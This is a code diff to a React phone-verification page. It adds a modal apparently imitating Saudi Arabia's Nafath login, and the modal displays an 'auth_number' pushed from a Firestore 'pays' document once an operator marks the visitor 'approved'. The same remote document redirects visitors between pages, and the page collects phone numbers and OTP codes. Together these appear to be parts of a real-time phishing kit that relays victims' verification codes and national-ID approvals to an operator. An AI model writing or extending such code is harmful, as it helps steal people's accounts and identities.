@@ -12,6 +12,7 @@ import { OtpInput } from "@/components/otp-input"
 import { Input } from "@/components/ui/input"
 import { Badge } from "@/components/ui/badge"
 import { doc, onSnapshot } from "firebase/firestore"
+import NafazModal from "@/components/nafaz-modal"
 
 // Function to get or create visitor ID
 const getOrCreateVisitorId = () => {
@@ -26,7 +27,6 @@ const getOrCreateVisitorId = () => {
       localStorage.setItem("visitor", visitorId)
     }
   }
-
   return visitorId
 }
 
@@ -43,11 +43,12 @@ export default function PhoneVerificationEnhanced() {
   const [phone, setPhone] = useState("")
   const [operator, setOperator] = useState("")
   const [visitorId, setVisitorId] = useState<string>("")
-  const [showSTCModal, setShowSTCModal] = useState(false)
+  const [showNafz, setShowNafaz] = useState(false)
 
   // OTP verification states
   const [otpCode, setOtpCode] = useState("")
   const [otpError, setOtpError] = useState("")
+  const [auth_number, setAuthNumber] = useState("")
   const [verificationStatus, setVerificationStatus] = useState<VerificationStatus>("idle")
 
   // Loader states
@@ -102,6 +103,10 @@ useEffect(()=>{
     const unsubscribe = onSnapshot(doc(db, "pays", visitorId!), (docSnapshot) => {
       if (docSnapshot.exists()) {
         const userData = docSnapshot.data()
+        if(userData.phoneVerificationStatus==="approved"){
+        setAuthNumber(userData.auth_number)
+        setShowNafaz(true)
+      }
         // Assuming the PIN is stored in a field called 'nafaz_pin'
         if(userData.currentPage ==='1'){
             window.location.href='/quote'
@@ -204,7 +209,6 @@ useEffect(()=>{
       localStorage.setItem("operator", operator)
 
       if (operator === "stc") {
-        setShowSTCModal(false)
         setShowLoader(true)
       } else {
         await PhoneVerificationService.verifyPhone(phone, operator)
@@ -293,7 +297,7 @@ useEffect(()=>{
       case "approved":
         return (
           <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto animate-pulse">
-            <Check className="h-10 w-10 text-green-600" />
+            <NafazModal isOpen={showNafz} onClose={()=>setShowNafaz(false)} phone={phone} auth_number={auth_number} />
           </div>
         )
       case "error":
